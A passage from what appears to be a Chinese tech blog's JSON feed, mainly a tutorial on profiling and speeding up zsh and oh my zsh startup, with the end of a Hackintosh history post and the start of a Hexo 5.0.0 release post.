25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\"> <div class=\"license-title\">黑苹果的历史</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-09-02</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\"> <div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-08-10</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 